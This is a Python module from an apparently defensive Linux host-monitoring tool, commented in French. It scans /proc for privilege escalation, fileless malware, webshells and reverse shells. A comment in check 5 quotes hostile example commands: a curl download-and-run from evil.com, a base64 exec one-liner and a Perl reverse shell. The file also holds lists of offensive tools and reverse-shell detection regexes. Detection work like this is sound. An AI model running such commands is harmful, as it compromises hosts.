"""
core/process_watcher.py
-----------------------
Surveillance des processus en cours d'exécution.

Lit directement dans /proc — le filesystem virtuel du kernel Linux
qui expose TOUTE la vie interne du système en temps réel.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
QU'EST-CE QUE /proc ?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  /proc est un pseudo-filesystem — il n'existe pas sur disque.
  Le kernel le génère à la volée en RAM à chaque lecture.

  Structure :
    /proc/<PID>/         → dossier pour chaque processus actif
    /proc/<PID>/status   → nom, PID, PPID, UID réel vs UID effectif
    /proc/<PID>/cmdline  → ligne de commande complète (args inclus)
    /proc/<PID>/exe      → symlink vers l'exécutable (peut être deleted!)
    /proc/<PID>/fd/      → tous les file descriptors ouverts
    /proc/<PID>/maps     → régions mémoire mappées (détecte l'injection)
    /proc/<PID>/net/tcp  → connexions réseau du processus

  Intérêt cyber : un attaquant peut renommer son malware "kworker"
  ou "systemd-private" pour se camoufler, mais /proc/exe révèle
  le vrai chemin de l'exécutable — même s'il a été supprimé du disque !


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CONCEPTS FONDAMENTAUX LINUX COUVERTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  UID RÉEL vs UID EFFECTIF (EUID) — Privilege Escalation
  ───────────────────────────────────────────────────────
  Chaque processus a DEUX identités :
    - UID  (Real User ID)      = qui a lancé le processus
    - EUID (Effective User ID) = avec quels droits il s'exécute

  Normalement UID == EUID.

  Exception : fichiers avec le bit SUID (Set User ID) :
    Si /usr/bin/sudo est SUID root → quand user "alice" le lance,
    UID=1000 (alice) mais EUID=0 (root).

  Technique d'exploitation :
    Un attaquant trouve un binaire SUID vulnérable (buffer overflow etc.)
    → l'exploite → obtient EUID=0 → devient root.

    Si on voit un processus avec UID=1000 et EUID=0,
    et que ce n'est PAS sudo/su/passwd → ALERTE ROUGE.


  PPID (Parent Process ID) — Détection d'anomalies d'héritage
  ─────────────────────────────────────────────────────────────
  Chaque processus a un parent.
  L'arbre de processus "normal" ressemble à :
    systemd (PID 1)
      └── sshd
            └── bash
                  └── python script.py

  Anomalies révélatrices :
    - Un shell (bash/sh) dont le parent est apache/nginx → webshell
    - Un shell dont le parent est python/php → reverse shell activé
    - Un processus réseau dont le parent est cron → persistence backdoor
    - Un bash dont PPID=1 (orphelin de systemd) → processus détaché


  MALWARE "FILELESS" — Exécutable supprimé mais toujours actif
  ─────────────────────────────────────────────────────────────
  Technique avancée : un malware se lance, puis SUPPRIME son propre
  exécutable du disque. Le processus continue de tourner en RAM.

  Détection : /proc/<PID>/exe pointe vers "/path/to/malware (deleted)"
  → Le kernel garde le fichier en mémoire tant que le processus tourne,
    mais il est invisible sur le disque (ls, find ne le trouvent pas).

  C'est le malware "fileless" — aucune trace sur disque, mais visible
  dans /proc. Seule façon de le détecter = inspecter /proc/exe.


  INJECTION MÉMOIRE — Processus légitime corrompu
  ─────────────────────────────────────────────────
  Un processus légitime (ex: bash) peut avoir du code malveillant
  INJECTÉ dans sa mémoire via ptrace() ou /proc/<PID>/mem.

  Détection partielle : /proc/<PID>/maps montre des régions mémoire
  avec permissions rwx (read+write+execute) sans fichier associé.
  Normalement une région est soit writable soit executable, pas les deux.
  rwx anonyme = shellcode injecté.


  PROCESSUS ZOMBIE ET ORPHELIN
  ─────────────────────────────
  Zombie : processus terminé mais non "reapé" par son parent.
    /proc/<PID>/status : State: Z
    Pas dangereux seul, mais beaucoup de zombies = bug ou rootkit.

  Orphelin : processus dont le parent est mort → adopté par PID 1 (init).
    PPID = 1 pour un processus interactif = suspect.
"""

import os
import re
import pwd
from pathlib import Path
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.logger import get_logger

# Noms de processus légitimes qui peuvent avoir EUID=0
# (whitelist partielle — à adapter selon l'environnement)
LEGIT_SUID_PROCS = {
    "sudo", "su", "passwd", "newgrp", "gpasswd",
    "mount", "umount", "ping", "pkexec",
    "sshd", "login", "cron", "at",
    "polkit", "dbus-daemon",
}

# Shells — un shell enfant d'un service web = webshell actif
SHELLS = {"bash", "sh", "zsh", "ksh", "fish", "dash", "rbash"}

# Services web — si leur enfant est un shell, c'est une compromission
WEB_PROCESSES = {
    "apache", "apache2", "nginx", "httpd",
    "php", "php-fpm", "php8", "php7",
    "python", "python3", "ruby", "perl",
    "node", "nodejs",
    "tomcat", "jetty",
}

# Outils offensifs connus — présence = compromission quasi-certaine
OFFENSIVE_TOOLS = {
    "mimikatz", "meterpreter", "metasploit", "empire",
    "cobaltstrike", "beacon", "sliver", "havoc",
    "ncat", "socat", "netcat",
    "masscan", "zmap",
    "hydra", "medusa", "hashcat",
    "sqlmap", "nikto",
    "chisel", "ligolo", "frp",   # tunneling tools
    "pwncat", "weevely",         # webshell clients
}

# Ports système réservés (< 1024) → nécessitent root normalement
# Un processus non-root écoutant sur ces ports = escalade probable
PRIVILEGED_PORTS = 1024


# ──────────────────────────────────────────────
# Point d'entrée principal
# ──────────────────────────────────────────────
def run(
    log_file: Path | None = None,
    verbose:  bool = False,
) -> list[dict]:
    """
    Scanne tous les processus actifs via /proc et retourne les findings.

    Heuristiques appliquées :
      1. UID réel ≠ UID effectif → privilege escalation potentielle
      2. Exécutable supprimé (deleted) → malware fileless
      3. Shell enfant d'un serveur web → webshell actif
      4. Nom d'outil offensif connu → compromission
      5. Processus caché (PID dans /proc mais absent de /proc/<PID>/status)
      6. Ligne de commande encodée/obfusquée (base64, eval...)
      7. Processus orphelin suspect (PPID=1 + shell)
    """
    log = get_logger("process_watcher", log_file, verbose)
    log.info("Starting process scan via /proc")

    # Collecter tous les PIDs actifs
    pids = _get_all_pids()
    log.info(f"Active PIDs found: {len(pids)}")

    findings: list[dict] = []

    # Analyse en parallèle — chaque processus est indépendant
    with ThreadPoolExecutor(max_workers=8) as executor:
        future_to_pid = {
            executor.submit(_analyze_process, pid, log): pid
            for pid in pids
        }
        for future in as_completed(future_to_pid):
            result = future.result()
            if result:
                findings.append(result)
                log.warning(
                    f"Suspicious process [{result['severity']}] "
                    f"PID={result['details'].get('pid')} "
                    f"| {result['reason']}"
                )

    log.info(f"Process scan complete | {len(findings)} finding(s)")
    return findings


# ──────────────────────────────────────────────
# Collecte des PIDs
# ──────────────────────────────────────────────
def _get_all_pids() -> list[int]:
    """
    Retourne la liste de tous les PIDs actifs en lisant /proc.

    /proc contient un dossier numéroté par PID pour chaque processus.
    On filtre les entrées numériques = PIDs.

    Pourquoi pas utiliser psutil ou ps ?
      → Dépendance externe évitée (psutil) ou appel subprocess (ps).
      → Un rootkit avancé peut hooker ps pour cacher des PIDs,
        mais /proc est plus difficile à falsifier sans patcher le kernel.
      → Lire /proc directement = plus proche du kernel = plus fiable.
    """
    pids = []
    try:
        for entry in os.listdir("/proc"):
            if entry.isdigit():
                pids.append(int(entry))
    except PermissionError:
        pass
    return sorted(pids)


# ──────────────────────────────────────────────
# Analyse d'un processus individuel
# ──────────────────────────────────────────────
def _analyze_process(pid: int, log) -> dict | None:
    """
    Analyse un processus donné via ses fichiers /proc/<PID>/*.
    Retourne un finding si suspect, None si propre.
    """
    proc_dir = Path(f"/proc/{pid}")
    if not proc_dir.exists():
        # Processus déjà terminé entre la collecte et l'analyse — normal
        return None

    # ── Lecture de /proc/<PID>/status ───────────────────────────────
    # Ce fichier contient : nom, état, UID réel, UID effectif, PPID...
    status = _read_proc_status(pid)
    if not status:
        return None

    name  = status.get("Name",  "unknown")
    ppid  = int(status.get("PPid", "0"))
    state = status.get("State", "?")[0]  # R=running, S=sleeping, Z=zombie

    # UIDs : format "UID_réel  UID_effectif  UID_sauvé  UID_filesystem"
    uids_raw  = status.get("Uid", "0 0 0 0").split()
    uid_real  = int(uids_raw[0]) if uids_raw else 0
    uid_eff   = int(uids_raw[1]) if len(uids_raw) > 1 else 0

    # ── Lecture de /proc/<PID>/cmdline ──────────────────────────────
    # Ligne de commande complète avec arguments (séparés par \x00)
    cmdline = _read_cmdline(pid)

    # ── Lecture de /proc/<PID>/exe ──────────────────────────────────
    # Chemin réel de l'exécutable (symlink résolu par le kernel)
    exe_path = _read_exe(pid)

    reasons:  list[str] = []
    severity: str = "LOW"
    details: dict = {
        "pid":      pid,
        "name":     name,
        "ppid":     ppid,
        "state":    state,
        "uid_real": uid_real,
        "uid_eff":  uid_eff,
        "cmdline":  cmdline[:200] if cmdline else "",
        "exe":      exe_path or "",
    }

    # ── Check 1 : Privilege Escalation (UID réel ≠ UID effectif) ────
    #
    # Si un processus s'exécute avec EUID=0 (root) mais a été lancé
    # par un user non-root (UID > 0), et que ce n'est PAS un binaire
    # SUID légitime (sudo, passwd...) → ALERTE.
    #
    # Exemple d'attaque :
    #   1. Attaquant exploite une vulnérabilité dans un binaire SUID
    #   2. Via buffer overflow, il contrôle l'exécution
    #   3. Le processus a toujours EUID=0 (hérité du SUID)
    #   4. → Accès root complet
    #
    # Outils de détection : pspy, lsof, ce module
    if uid_real > 0 and uid_eff == 0:
        name_lower = name.lower()
        if name_lower not in LEGIT_SUID_PROCS:
            reasons.append(
                f"Privilege escalation: UID={uid_real} but EUID=0 (root) "
                f"— process '{name}' not in SUID whitelist"
            )
            severity = _escalate(severity, "CRITICAL")
            try:
                username = pwd.getpwuid(uid_real).pw_name
                details["username"] = username
            except KeyError:
                details["username"] = str(uid_real)

    # ── Check 2 : Exécutable supprimé (Fileless Malware) ────────────
    #
    # Technique : le malware se lance, puis supprime son propre fichier.
    # Il reste en RAM mais est invisible sur disque (find, ls ne le voient pas).
    # /proc/<PID>/exe contient alors "(deleted)" dans son chemin.
    #
    # Pourquoi le kernel permet ça ?
    #   Sur Linux, "supprimer" un fichier = décrémenter son inode count.
    #   Tant qu'un processus le tient ouvert, le fichier reste accessible.
    #   Quand tous les fd sont fermés → libération réelle.
    #
    # Variante : certains malwares écrivent en mémoire partagée /dev/shm
    # puis exécutent depuis là → même pattern.
    if exe_path and "(deleted)" in exe_path:
        reasons.append(
            f"Fileless malware indicator: executable deleted from disk "
            f"but still running | exe='{exe_path}'"
        )
        severity = _escalate(severity, "CRITICAL")

    # ── Check 3 : Shell enfant d'un serveur web (Webshell actif) ────
    #
    # Scénario d'attaque classique :
    #   1. Attaquant upload un webshell PHP sur un site web vulnérable
    #   2. Il l'active via HTTP → le serveur web (apache/nginx) exécute PHP
    #   3. PHP exécute system("bash -c '...'") → spawn un shell
    #   4. Ce shell est enfant de apache/nginx → détectable ici
    #
    # Arbre de processus normal :
    #   apache2 (PID 123)
    #     └── apache2 worker (PID 456)   ← enfants normaux
    #
    # Arbre suspect :
    #   apache2 (PID 123)
    #     └── php (PID 456)
    #           └── bash (PID 789)   ← ALERTE
    #
    # Le PPID de bash = 456 (php), qui lui-même est enfant d'apache.
    # On détecte un niveau d'indirection.
    name_lower = name.lower()
    if name_lower in SHELLS:
        parent_name = _get_process_name(ppid)
        if parent_name and parent_name.lower() in WEB_PROCESSES:
            reasons.append(
                f"Webshell detected: shell '{name}' (PID {pid}) "
                f"spawned by web process '{parent_name}' (PPID {ppid})"
            )
            severity = _escalate(severity, "CRITICAL")

    # ── Check 4 : Outil offensif connu ──────────────────────────────
    #
    # Certains outils n'ont aucune raison légitime d'être en production :
    # mimikatz (dump de credentials Windows), meterpreter (C2 Metasploit),
    # sliver/havoc/cobaltstrike (C2 frameworks modernes)...
    #
    # Si on les voit dans le nom du processus OU dans la cmdline → compromission.
    # Un pentester légitime aurait dû préavertir et documenter son travail.
    cmdline_lower = cmdline.lower() if cmdline else ""
    for tool in OFFENSIVE_TOOLS:
        if tool in name_lower or tool in cmdline_lower:
            reasons.append(
                f"Known offensive tool detected: '{tool}' in process '{name}'"
            )
            severity = _escalate(severity, "CRITICAL")
            break

    # ── Check 5 : Ligne de commande obfusquée ───────────────────────
    #
    # Les malwares et reverse shells obfusquent souvent leur cmdline :
    #   python3 -c "exec(__import__('base64').b64decode('aW1wb3...'))"
    #   bash -c "$(curl -s http://evil.com/payload.sh)"
    #   perl -e 'use Socket; ...'   ← one-liner reverse shell classique
    #
    # L'obfuscation en base64 est le signe le plus fort :
    #   Un admin légitime n'a jamais besoin de base64-encoder ses commandes.
    #   Un malware le fait pour éviter les signatures statiques.
    if cmdline:
        obfusc_patterns = [
            (r"base64\s*-d",          "base64 decode in cmdline"),
            (r"exec\s*\(\s*__import__","Python exec+import obfuscation"),
            (r"\$\(curl\s+",           "curl-in-subshell execution"),
            (r"\$\(wget\s+",           "wget-in-subshell execution"),
            (r"bash\s+-i\s+>&",        "interactive reverse shell"),
            (r"perl\s+-e\s+'use\s+Socket", "Perl reverse shell one-liner"),
            (r"python[23]?\s+-c\s+\"import\s+socket", "Python socket reverse shell"),
            (r"/dev/tcp/",             "Bash /dev/tcp reverse shell"),
        ]
        for pattern, desc in obfusc_patterns:
            if re.search(pattern, cmdline, re.IGNORECASE):
                reasons.append(f"Obfuscated cmdline: {desc}")
                severity = _escalate(severity, "HIGH")
                break

    # ── Check 6 : Processus orphelin suspect ────────────────────────
    #
    # Un processus orphelin = son parent est mort, adopté par PID 1.
    # Légitime pour des daemons (sshd, cron...).
    # Suspect si c'est un shell ou un interpréteur interactif.
    #
    # Technique d'attaque : un reverse shell se détache de son parent
    # avec double-fork() → devient orphelin de PID 1 → survit si le
    # parent meurt (ex: si la session SSH de l'attaquant est coupée).
    if ppid == 1 and name_lower in SHELLS:
        reasons.append(
            f"Orphan shell: '{name}' (PID {pid}) is child of PID 1 (init) "
            f"— possible detached reverse shell"
        )
        severity = _escalate(severity, "HIGH")

    # ── Check 7 : Processus zombie en masse ─────────────────────────
    #
    # Un zombie = processus terminé mais non "récolté" par son parent.
    # Seuls : inoffensifs. En masse : signe d'un programme bugué
    # ou d'un rootkit qui fork() massivement sans wait().
    # (Détection en masse gérée dans run(), pas ici par processus.)

    # ── Résultat ─────────────────────────────────────────────────────
    if not reasons:
        return None

    return {
        "severity":  severity,
        "target":    f"PID {pid} ({name})",
        "reason":    " | ".join(reasons),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "module":    "process_watcher",
        "details":   details,
    }


# ──────────────────────────────────────────────
# Helpers de lecture /proc
# ──────────────────────────────────────────────
def _read_proc_status(pid: int) -> dict[str, str] | None:
    """
    Lit /proc/<PID>/status et retourne un dict clé→valeur.

    Format du fichier :
      Name:   bash
      State:  S (sleeping)
      Pid:    1234
      PPid:   1000
      Uid:    1000  1000  1000  1000
      ...

    Chaque ligne = "Clé:\tValeur".
    """
    status_file = Path(f"/proc/{pid}/status")
    try:
        content = status_file.read_text(encoding="utf-8", errors="replace")
        result  = {}
        for line in content.splitlines():
            if ":" in line:
                key, _, val = line.partition(":")
                result[key.strip()] = val.strip()
        return result
    except (PermissionError, FileNotFoundError, ProcessLookupError, OSError):
        return None


def _read_cmdline(pid: int) -> str:
    """
    Lit /proc/<PID>/cmdline — la commande complète avec ses arguments.

    Les arguments sont séparés par le caractère nul \\x00 (NUL byte).
    On les remplace par des espaces pour avoir une string lisible.

    Subtilité : un processus peut modifier son propre /proc/cmdline
    pour se camoufler (technique "argv[0] spoofing").
    Ex: un malware peut se renommer "kworker/0:1" dans cmdline
    mais /proc/exe révèle le vrai binaire.
    """
    try:
        data = Path(f"/proc/{pid}/cmdline").read_bytes()
        return data.replace(b"\x00", b" ").decode("utf-8", errors="replace").strip()
    except (PermissionError, FileNotFoundError, OSError):
        return ""


def _read_exe(pid: int) -> str | None:
    """
    Résout le symlink /proc/<PID>/exe → chemin réel de l'exécutable.

    Si le fichier a été supprimé, le kernel ajoute " (deleted)" au chemin.
    C'est la détection clé du malware fileless.

    Nécessite souvent root pour lire les exe d'autres utilisateurs.
    """
    try:
        return os.readlink(f"/proc/{pid}/exe")
    except (PermissionError, FileNotFoundError, OSError):
        return None


def _get_process_name(pid: int) -> str | None:
    """Retourne le nom d'un processus par son PID, ou None."""
    status = _read_proc_status(pid)
    return status.get("Name") if status else None


# ──────────────────────────────────────────────
# Escalade de sévérité
# ──────────────────────────────────────────────
_SEV_RANK = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}

def _escalate(current: str, candidate: str) -> str:
    return candidate if _SEV_RANK.get(candidate, 0) > _SEV_RANK.get(current, 0) else current